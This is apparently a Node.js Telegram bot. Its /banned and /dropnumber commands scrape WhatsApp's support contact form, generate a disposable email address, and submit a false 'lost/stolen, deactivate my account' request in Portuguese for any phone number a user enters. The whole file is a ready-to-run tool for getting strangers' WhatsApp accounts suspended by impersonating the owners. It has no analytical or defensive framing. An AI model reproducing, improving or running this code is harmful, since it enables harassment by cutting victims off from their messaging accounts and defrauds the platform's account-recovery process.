const { Telegraf } = require('telegraf');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram Bot token
const bot = new Telegraf('YOUR_TELEGRAM_BOT_TOKEN');

bot.start((ctx) => ctx.reply('Welcome to the WhatsApp submission bot! Use /banned <phone_number> to ban a number.'));

bot.on('text', async (ctx) => {
    const message = ctx.message.text;
    const command = message.split(' ')[0];

    switch (command) {
        case '/menu':
            const menu = `
            Available commands:
            /submit <phone_number> - Submit a request to WhatsApp.
            /dropnumber <phone_number> - Initiate a temporary ban on WhatsApp.
            `;
            ctx.reply(menu);
            break;
        case '/banned':
            const bannedArgs = message.split(' ');
            const bannedPhoneNumber = bannedArgs.length > 1 ? bannedArgs[1] : null;
            if (!bannedPhoneNumber) {
                ctx.reply('Please provide the target phone number.');
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Perdido/roubado: desative minha conta");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                ctx.reply(`Success! The request has been submitted to WhatsApp.`);
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        case '/dropnumber':
            const dropArgs = message.split(' ');
            const dropPhoneNumber = dropArgs.length > 1 ? dropArgs[1] : null;
            if (!dropPhoneNumber) {
                ctx.reply('Please provide the target phone number.');
                return;
            }
            const ddi = dropPhoneNumber.substring(0, 2);
            const number = dropPhoneNumber.substring(2);

            try {
                const res = await dropNumber({ phoneNumber: dropPhoneNumber, ddi, number });
                ctx.reply(`Success! System number ${ddi}${number} has been initiated.`);
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        default:
            // Handle unknown commands or do nothing
            break;
    }
});

const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    const numbers = JSON.parse(fs.readFileSync('./YUDAMODS/crash.json'));

    try {
        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        const cookie = ntah.headers["set-cookie"].join("; ");
        const $ = cheerio.load(ntah.data);
        const $form = $("form");
        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        const form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val());
        form.append("lsd", $form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", phoneNumber);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        const res = await axios({
            url,
            method: "POST",
            data: form,
            headers: {
                cookie
            }
        });

        return true;
    } catch (error) {
        throw new Error(`Failed to initiate system number ${ddi}${number}: ${error.message}`);
    }
};

bot.launch();
